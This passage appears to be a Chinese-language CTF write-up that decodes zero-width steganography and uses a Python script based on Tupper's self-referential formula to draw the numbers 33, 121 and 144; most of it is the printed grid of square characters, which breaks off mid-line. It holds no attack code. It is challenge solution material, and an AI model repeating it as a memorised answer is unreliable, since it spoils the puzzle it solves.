13152\uff0c\u6253\u5f00\u6587\u4ef6\u5f97\u5230\u538b\u7f29\u5305\u7684\u5bc6\u7801</p> <p></p> <p>\u89e3\u538b\u5f97\u5230\u4e24\u4e2a\u6587\u4ef6</p> <p></p> <p><code>hint.txt</code> \u662f\u96f6\u5bbd\u9690\u5199\uff0c\u5f97\u5230 <code>22*160</code></p> <p></p> <p>\u8fd9\u91cc\u6d89\u53ca\u5230 <code>\u5854\u73c0\u81ea\u6307\u516c\u5f0f(Tupper's self-referential formula)</code> \u77e5\u8bc6\u70b9\uff0c\u4f46\u9ed8\u8ba4\u7684 online decode \u6807\u51c6\u662f <code>17*106</code> \u7684</p> <p></p> <p>\u53c2\u8003\u63d0\u793a\u5199\u811a\u672c\u91cd\u65b0\u7ed8\u56fe</p> <pre><code>from functools import reduce\n\n\ndef Tuppers_Self_Referential_Formula():\n    k = 92898203278702907929705938676672021500394791427205757369123489204565300324859717082409892641951206664564991991489354661871425872649524078000948199832659815275909285198829276929014694628110159824930931595166203271443269827449505707655085842563682060910813942504507936625555735585913273575050118552353192682955310220323463465408645422334101446471078933149287336241772448338428740302833855616421538520769267636119285948674549756604384946996184385407505456168240123319785800909933214695711828013483981731933773017336944656397583872267126767778549745087854794302808950100966582558761224454242018467578959766617176016660101690140279961968740323327369347164623746391335756442566959352876706364265509834319910419399748338894746638758652286771979896573695823608678008814861640308571256880794312652055957150464513950305355055495262375870102898500643010471425931450046440860841589302890250456138060738689526283389256801969190204127358098408264204643882520969704221896973544620102494391269663693407573658064279947688509910028257209987991480259150865283245150325813888942058\n\n    def f(x, y):\n        d = ((-22 * x) - (y % 22))\n        e = reduce(lambda x, y: x * y, [2 for x in range(-d)]) if d else 1\n        g = ((y // 22) // e) % 2\n        return 0.5 &lt; g\n\n    for y in range(k + 21, k - 1, -1):\n        line = \"\"\n        for x in range(0, 160):\n            if f(x, y):\n                line += \" \u25a0\"\n            else:\n                line += \"  \"\n        print(line)\n\n\nif __name__ == '__main__':\n    Tuppers_Self_Referential_Formula()\n</code></pre> <p>\u8fd0\u884c\u7ed3\u679c\u5f97\u5230\u4e09\u4e2a\u6570 <code>33</code>\u3001<code>121</code>\u3001<code>144</code></p> <pre><code> \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0   \u25a0 \u25a0   \u25a0 \u25a0 \u25a0   \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0   \u25a0 \u25a0   \u25a0 \u25a0 \u25a0   \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 